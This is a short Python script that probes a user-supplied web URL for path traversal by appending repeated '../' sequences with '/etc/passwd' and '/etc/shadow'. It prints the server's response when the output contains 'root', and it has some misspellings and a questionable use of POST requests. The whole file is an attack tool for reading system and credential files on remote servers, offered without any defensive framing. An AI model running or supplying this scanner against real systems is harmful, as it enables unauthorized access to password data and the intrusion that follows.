import requests

print('Warning:in your target address should be a input parametr such example.com/index.php?file=')
url = input('Enter your url: ')
payloads = {'/etc/passwd':'root','/etc/shadow':'root'}

dr = '../'
n = 0

for payload, key in payloads.items():
    for n in range(7):
        req = requests.post(url + (n*dr) + payload)
        if key in req.text:
            print('This parametr is vulnabere and attack string is {}\n'.format((n*dr)+payload))
            print(req.text)
            break
        else:
            pass
